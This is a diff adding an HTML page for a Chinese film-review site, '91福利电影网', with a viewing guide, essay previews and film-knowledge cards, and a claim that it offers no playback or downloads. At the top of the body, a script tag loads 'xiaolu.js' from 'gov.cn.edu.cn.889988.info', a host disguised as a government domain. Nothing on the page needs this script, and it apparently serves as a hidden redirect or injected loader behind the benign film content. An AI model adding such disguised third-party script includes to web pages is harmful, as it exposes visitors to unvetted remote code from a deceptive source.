@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>91福利电影网 | 原创影评、观影指南与幕后知识</title>
+<meta name="description" content="91福利电影网（https://91fulidianyingwang-wap.github.io）专注原创影评、观影指南与电影幕后知识分享，为影迷提供可收藏的深度内容，不提供任何在线播放或下载资源。">
+<meta name="keywords" content="91福利电影网, 91fulidianyingwang-wap, 91福利电影网影评, 观影指南, 电影幕后知识, 电影推荐">
+<meta name="author" content="91福利电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#0b1220">
+<meta property="og:type" content="website">
+<meta property="og:title" content="91福利电影网 | 原创影评、观影指南与幕后知识">
+<meta property="og:description" content="专注原创影评、观影指南与电影幕后知识分享的影迷内容站。">
+<meta property="og:url" content="https://91fulidianyingwang-wap.github.io">
+<meta property="og:site_name" content="91福利电影网">
+<link rel="canonical" href="https://91fulidianyingwang-wap.github.io">
+<style>
+:root{
+  --bg:#0b1220;
+  --bg2:#0f1830;
+  --ink:#eef2f9;
+  --ink2:#aab5cc;
+  --accent:#39d0c4;
+  --accent2:#5b8cff;
+  --warm:#ffb454;
+  --line:rgba(255,255,255,.09);
+  --card:rgba(255,255,255,.04);
+  --radius:16px;
+  --max:1180px;
+  --shadow:0 20px 50px rgba(0,0,0,.5);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",system-ui,sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(900px 560px at 85% -6%,rgba(91,140,255,.24),transparent 62%),
+    radial-gradient(760px 500px at 8% 6%,rgba(57,208,196,.18),transparent 60%),
+    linear-gradient(180deg,#0b1220,#080c16);
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.container{max-width:var(--max);margin:0 auto;padding:0 24px}
+
+/* ===== header ===== */
+.site-header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);background:rgba(9,14,26,.74);border-bottom:1px solid var(--line)}
+.site-header .container{display:flex;align-items:center;justify-content:space-between;height:68px;gap:18px}
+.brand{display:flex;align-items:baseline;gap:10px;min-width:0}
+.brand b{font-size:21px;white-space:nowrap}
+.brand span{font-size:12px;color:var(--ink2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.nav-links{display:flex;gap:2px;align-items:center}
+.nav-links a{padding:9px 14px;border-radius:10px;font-size:15px;color:var(--ink2);transition:.2s;white-space:nowrap}
+.nav-links a:hover{color:#fff;background:var(--card)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:10px;background:var(--card);color:#fff;font-size:19px;cursor:pointer;align-items:center;justify-content:center}
+
+/* ===== hero ===== */
+.hero{padding:68px 0 44px;position:relative}
+.ticker{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:34px}
+.ticker i{font-style:normal;font-size:12.5px;padding:6px 12px;border-radius:999px;background:var(--card);border:1px solid var(--line);color:var(--ink2)}
+.ticker i b{color:var(--warm);font-weight:600}
+.hero-grid{display:grid;grid-template-columns:1.05fr .95fr;gap:46px;align-items:center}
+.hero h1{font-size:clamp(30px,5vw,54px);line-height:1.16;margin:0 0 20px;font-weight:800;letter-spacing:.5px}
+.hero h1 em{font-style:normal;background:linear-gradient(94deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lead{font-size:17px;color:var(--ink2);max-width:58ch;margin:0 0 28px}
+.cta{display:flex;flex-wrap:wrap;gap:12px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 23px;border-radius:12px;font-size:15px;font-weight:600;border:1px solid transparent;transition:.2s;cursor:pointer}
+.btn-p{background:linear-gradient(94deg,var(--accent),var(--accent2));color:#07101c;box-shadow:var(--shadow)}
+.btn-p:hover{transform:translateY(-2px)}
+.btn-g{color:#fff;border-color:var(--line);background:var(--card)}
+.btn-g:hover{border-color:rgba(255,255,255,.35)}
+
+.device{position:relative;padding:14px;border:1px solid var(--line);border-radius:26px;background:linear-gradient(160deg,rgba(255,255,255,.06),rgba(255,255,255,.015));box-shadow:var(--shadow)}
+.device::before{content:"";position:absolute;inset:-14%;z-index:-1;background:conic-gradient(from 140deg at 50% 50%,rgba(57,208,196,.3),transparent 32%,rgba(91,140,255,.28) 58%,transparent 76%);filter:blur(30px);border-radius:36px}
+.screen{position:relative;border-radius:16px;overflow:hidden;aspect-ratio:4/5;background:#0c1428}
+.screen .glow{position:absolute;inset:0;background:
+    radial-gradient(68% 52% at 26% 20%,rgba(91,140,255,.5),transparent 62%),
+    radial-gradient(58% 46% at 76% 80%,rgba(57,208,196,.45),transparent 64%),
+    linear-gradient(150deg,#17254a,#0c1428);}
+.screen .scan{position:absolute;left:12%;right:12%;top:16%;bottom:26%;border:1px solid rgba(255,255,255,.22);border-radius:10px;box-shadow:inset 0 0 0 8px rgba(255,255,255,.05),0 0 0 1px rgba(255,255,255,.06)}
+.screen .cap{position:absolute;left:0;right:0;bottom:0;padding:26px;background:linear-gradient(0deg,rgba(7,11,22,.97),transparent)}
+.screen .cap small{color:var(--warm);letter-spacing:2px;font-size:12px}
+.screen .cap strong{display:block;font-size:25px;line-height:1.35;margin-top:6px}
+
+/* ===== section ===== */
+section{padding:56px 0}
+.sec-head{display:flex;align-items:end;justify-content:space-between;gap:16px;margin-bottom:28px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(23px,3.2vw,32px);margin:0;letter-spacing:.5px}
+.sec-head h2 small{display:block;font-size:12.5px;color:var(--accent);letter-spacing:3px;margin-bottom:6px;font-weight:700}
+.sec-head a.more{color:var(--ink2);font-size:14px;border-bottom:1px solid var(--line);padding-bottom:2px}
+.sec-head a.more:hover{color:#fff;border-color:#fff}
+
+/* ===== guide（横向滑动条）===== */
+.guide{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:10px;-webkit-overflow-scrolling:touch}
+.guide::-webkit-scrollbar{height:8px}
+.guide::-webkit-scrollbar-thumb{background:rgba(255,255,255,.16);border-radius:8px}
+.guide .step{flex:0 0 300px;scroll-snap-align:start;padding:24px;border-radius:var(--radius);background:linear-gradient(165deg,rgba(255,255,255,.055),rgba(255,255,255,.018));border:1px solid var(--line)}
+.guide .step .n{width:40px;height:40px;border-radius:11px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:17px;margin-bottom:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#07101c}
+.guide .step h3{margin:0 0 8px;font-size:18px}
+.guide .step p{margin:0;color:var(--ink2);font-size:14.5px}
+
+/* ===== 长文列表（不同 DOM）===== */
+.posts{display:flex;flex-direction:column;gap:16px}
+.post{display:grid;grid-template-columns:150px 1fr auto;gap:22px;align-items:center;padding:18px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);transition:.25s}
+.post:hover{transform:translateY(-3px);border-color:rgba(255,255,255,.3)}
+.cover{position:relative;aspect-ratio:5/4;border-radius:12px;overflow:hidden}
+.cover .c{position:absolute;inset:0}
+.c1{background:linear-gradient(135deg,#23406e,#101c34)}
+.c1::after{content:"";position:absolute;inset:14%;border-radius:8px;background:repeating-linear-gradient(90deg,transparent 0 14px,rgba(255,255,255,.22) 14px 15px)}
+.c2{background:linear-gradient(135deg,#5c2b47,#25111e)}
+.c2::after{content:"";position:absolute;left:50%;top:14%;width:44%;aspect-ratio:1;border-radius:50%;transform:translateX(-50%);background:radial-gradient(circle at 34% 28%,#ffd2a0,#d1636f)}
+.c3{background:linear-gradient(135deg,#1f4b48,#0d201f)}
+.c3::after{content:"";position:absolute;left:16%;right:16%;top:34%;height:2px;background:rgba(255,255,255,.45);box-shadow:0 -20px 0 rgba(255,255,255,.22),0 20px 0 rgba(255,255,255,.6)}
+.cover em{position:absolute;bottom:8px;left:8px;font-style:normal;font-size:11px;padding:3px 7px;border-radius:5px;background:rgba(7,11,22,.72);color:var(--warm)}
+.post .txt h3{margin:0 0 7px;font-size:19px;line-height:1.45}
+.post .txt p{margin:0;color:var(--ink2);font-size:14.5px}
+.post .side{text-align:right;white-space:nowrap;color:#8591ab;font-size:13px}
+.post .side b{display:block;color:var(--accent);font-size:15px;margin-bottom:4px}
+
+/* ===== knowledge（九宫格）===== */
+.know{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.know a{padding:22px;border-radius:var(--radius);background:var(--card);border:1px solid var(--line);transition:.25s;display:block;min-height:150px}
+.know a:hover{border-color:var(--accent);transform:translateY(-4px)}
+.know a b{display:block;font-size:17px;margin-bottom:8px}
+.know a span{font-size:14px;color:var(--ink2);display:block}
+.know a i{font-style:normal;font-size:12px;color:var(--accent);display:block;margin-top:12px;letter-spacing:1px}
+
+/* ===== about ===== */
+.about{display:grid;grid-template-columns:1.1fr .9fr;gap:24px}
+.box{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:28px}
+.box h3{margin:0 0 14px;font-size:20px}
+.box p{margin:0 0 12px;color:var(--ink2);font-size:15px}
+.box code{background:rgba(255,255,255,.08);padding:1px 7px;border-radius:5px;font-size:13px;color:var(--warm)}
+.notice{border-left:3px solid var(--warm);padding:12px 16px;border-radius:0 10px 10px 0;background:rgba(255,180,84,.08);font-size:14px;color:#e8d8bd}
+.links{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.links a{display:block;padding:11px 13px;border:1px solid var(--line);border-radius:9px;font-size:14px;color:var(--ink2);transition:.2s}
+.links a:hover{border-color:var(--accent);color:#fff}
+
+/* ===== footer ===== */
+.site-footer{border-top:1px solid var(--line);padding:34px 0 44px;color:#8591ab;font-size:13.5px}
+.site-footer .container{display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap}
+.site-footer a{color:var(--ink2)}
+
+@media (max-width:960px){
+  .hero-grid{grid-template-columns:1fr;gap:34px}
+  .device{max-width:390px}
+  .know{grid-template-columns:1fr 1fr}
+  .about{grid-template-columns:1fr}
+  .post{grid-template-columns:120px 1fr}
+  .post .side{display:none}
+}
+@media (max-width:640px){
+  .site-header .container{height:60px}
+  .brand b{font-size:18px}
+  .brand span{display:none}
+  .menu-btn{display:inline-flex}
+  .nav-links{position:fixed;top:60px;left:0;right:0;flex-direction:column;align-items:stretch;gap:0;background:rgba(9,14,26,.98);border-bottom:1px solid var(--line);padding:12px;clip-path:inset(0 0 100% 0);transition:.28s ease}
+  .nav-links.open{clip-path:inset(0 0 0 0)}
+  .nav-links a{padding:13px 14px;border-radius:8px}
+  .hero{padding:40px 0 26px}
+  section{padding:40px 0}
+  .know{grid-template-columns:1fr}
+  .post{grid-template-columns:1fr}
+  .post .cover{max-width:240px}
+  .links{grid-template-columns:1fr}
+  .container{padding:0 17px}
+  .screen .cap{padding:20px}
+  .screen .cap strong{font-size:20px}
+}
+@media print{body{background:#fff;color:#000}.site-header,.menu-btn,.cta,.site-footer{display:none}section{page-break-inside:avoid}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="site-header">
+  <div class="container">
+    <div class="brand">
+      <b>91福利电影网</b>
+      <span>91fulidianyingwang-wap.github.io</span>
+    </div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#guide">指南</a>
+      <a href="#posts">长文</a>
+      <a href="#know">知识</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="打开菜单">☰</button>
+  </div>
+</header>
+
+<main>
+
+  <!-- ============ 首页 ============ -->
+  <section class="hero" id="home">
+    <div class="container">
+      <div class="ticker">
+        <i><b>● 原创</b> 每周更新深度内容</i>
+        <i>独立影评与观影指南</i>
+        <i>电影幕后知识科普</i>
+        <i>不提供在线播放或下载</i>
+      </div>
+      <div class="hero-grid">
+        <div>
+          <h1>看电影之前，<br><em>先看懂这门语言。</em></h1>
+          <p class="lead">91福利电影网把“看懂”这件事拆开讲：镜头为什么这么切、节奏为什么这么拖、情绪是怎么被声音推上去的。不追首发热度，只做能回头再翻的内容。</p>
+          <div class="cta">
+            <a class="btn btn-p" href="#posts">读深度长文</a>
+            <a class="btn btn-g" href="#guide">从零开始看片</a>
+          </div>
+        </div>
+        <div class="device">
+          <div class="screen">
+            <div class="glow"></div>
+            <div class="scan"></div>
+            <div class="cap">
+              <small>本期编辑精选</small>
+              <strong>「开场五分钟：<br>导演如何用第一个镜头定调」</strong>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 指南 ============ -->
+  <section id="guide">
+    <div class="container">
+      <div class="sec-head">
+        <h2><small>STARTER GUIDE</small>从零开始的观影指南</h2>
+        <a class="more" href="#">查看完整指南 #</a>
+      </div>
+      <div class="guide">
+
+        <div class="step">
+          <div class="n">1</div>
+          <h3>先选一个入口类型</h3>
+          <p>别从“最经典”开始。按你愿意投入的注意力选：剧情片看人物，悬疑看信息差，文艺片看影像质感。</p>
+        </div>
+
+        <div class="step">
+          <div class="n">2</div>
+          <h3>看片前只查必要信息</h3>
+          <p>知道类型、片长和导演就够了。避开剧情简介与评分评论，防止第一遍的体验被剧透提前消费。</p>
+        </div>
+
+        <div class="step">
+          <div class="n">3</div>
+          <h3>第一遍交给直觉</h3>
+          <p>先判断自己被什么打动——是一句对白、一段音乐，还是某个空镜。记下时间点，比记剧情更有用。</p>
+        </div>
+
+        <div class="step">
+          <div class="n">4</div>
+          <h3>第二遍问结构</h3>
+          <p>把叙事拆成段落：开场、转折、低谷、解决。你会发现很多“看不懂”其实是没找到段落边界。</p>
+        </div>
+
+        <div class="step">
+          <div class="n">5</div>
+          <h3>用片单替代单部推荐</h3>
+          <p>同一个主题连看三到五部，差异会自己浮现。片单比任何影评都更能训练你的判断力。</p>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 长文 ============ -->
+  <section id="posts" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.022),transparent)">
+    <div class="container">
+      <div class="sec-head">
+        <h2><small>DEEP READS</small>深度长文</h2>
+        <a class="more" href="#">全部长文 #</a>
+      </div>
+      <div class="posts">
+
+        <article class="post">
+          <div class="cover"><div class="c c1"></div><em>结构</em></div>
+          <div class="txt">
+            <h3>三幕式不是公式：它只是给观众的情绪路线图</h3>
+            <p>同样的三幕骨架，为什么有人拍得工整，有人拍得松垮？关键不在是否转折，而在转折是否有代价。</p>
+          </div>
+          <div class="side"><b>12 分钟</b>2026-09-26</div>
+        </article>
+
+        <article class="post">
+          <div class="cover"><div class="c c2"></div><em>表演</em></div>
+          <div class="txt">
+            <h3>好表演往往最不“像在演”</h3>
+            <p>从眼神回避到呼吸节奏，拆解四段没有台词的群戏，看演员如何用身体完成叙事交代。</p>
+          </div>
+          <div class="side"><b>9 分钟</b>2026-09-14</div>
+        </article>
+
+        <article class="post">
+          <div class="cover"><div class="c c3"></div><em>声音</em></div>
+          <div class="txt">
+            <h3>声音设计才是隐形的剪辑师</h3>
+            <p>对白清晰只是最低要求。底噪、静默与低频如何提前暗示情绪走向，本文用可复现的听感实验说明。</p>
+          </div>
+          <div class="side"><b>11 分钟</b>2026-08-30</div>
+        </article>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 知识 ============ -->
+  <section id="know">
+    <div class="container">
+      <div class="sec-head">
+        <h2><small>KNOW-HOW</small>电影知识库</h2>
+        <a class="more" href="#">进入知识库 #</a>
+      </div>
+      <div class="know">
+
+        <a href="#"><b>24 帧与 48 帧</b><span>帧率变化影响的不只是清晰度，还有观众的“距离感”。</span><i>影像基础 →</i></a>
+        <a href="#"><b>长镜头的三条命</b><span>一镜到底可以是炫技，也可以是叙事策略，差别在动机。</span><i>镜头语言 →</i></a>
+        <a href="#"><b>色彩讲什么</b><span>冷暖对比不是装饰，它负责暗示关系与权力变化。</span><i>美术与色彩 →</i></a>
+        <a href="#"><b>配乐何时该停</b><span>音乐退场的一刻，往往才是情绪真正落地的位置。</span><i>声音设计 →</i></a>
+        <a href="#"><b>剪辑的省略</b><span>剪掉什么，比留下什么更能体现导演的判断力。</span><i>剪辑节奏 →</i></a>
+        <a href="#"><b>片名的翻译</b><span>译名不是字面转换，它决定了观众带着什么预期入场。</span><i>文本与翻译 →</i></a>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 关于 ============ -->
+  <section id="about" style="background:linear-gradient(180deg,rgba(255,255,255,.02),transparent)">
+    <div class="container">
+      <div class="sec-head">
+        <h2><small>ABOUT</small>关于本站</h2>
+        <a class="more" href="#">投稿与纠错 #</a>
+      </div>
+      <div class="about">
+
+        <div class="box">
+          <h3>91福利电影网 做什么</h3>
+          <p>91福利电影网（网址：<code>https://91fulidianyingwang-wap.github.io</code>）是一个由影迷维护的独立内容站点，主要发布原创影评、观影指南与电影幕后知识科普。</p>
+          <p>本站不提供任何在线播放、下载或盗版资源链接，文中出现的影片名称仅用于评论、研究与推荐目的。如需观看，请通过正规购票或订阅渠道。</p>
+          <div class="notice">提示：本站为静态单页站点，栏目锚点用于站内定位；内页占位链接以 # 表示，未生成 robots.txt 与 sitemap.xml。</div>
+        </div>
+
+        <div class="box">
+          <h3>栏目与内页链接</h3>
+          <ul class="links">
+            <li><a href="#home">首页 · 编辑精选</a></li>
+            <li><a href="#guide">指南 · 从零开始</a></li>
+            <li><a href="#posts">长文 · 深度阅读</a></li>
+            <li><a href="#know">知识 · 电影知识库</a></li>
+            <li><a href="#">投稿须知 #</a></li>
+            <li><a href="#">评论区规则 #</a></li>
+            <li><a href="#">隐私说明 #</a></li>
+            <li><a href="#">免责声明 #</a></li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div>© 2026 91福利电影网 · 网站名称：91福利电影网 · 网站网址：https://91fulidianyingwang-wap.github.io · 内容仅供学习与讨论</div>
+    <div><a href="#">返回顶部 #</a> · <a href="#">RSS #</a></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn');
+  var nav=document.getElementById('navLinks');
+  if(!btn||!nav)return;
+  btn.addEventListener('click',function(){nav.classList.toggle('open');});
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){nav.classList.remove('open');}
+  });
+})();
+</script>
+</body>
+</html>
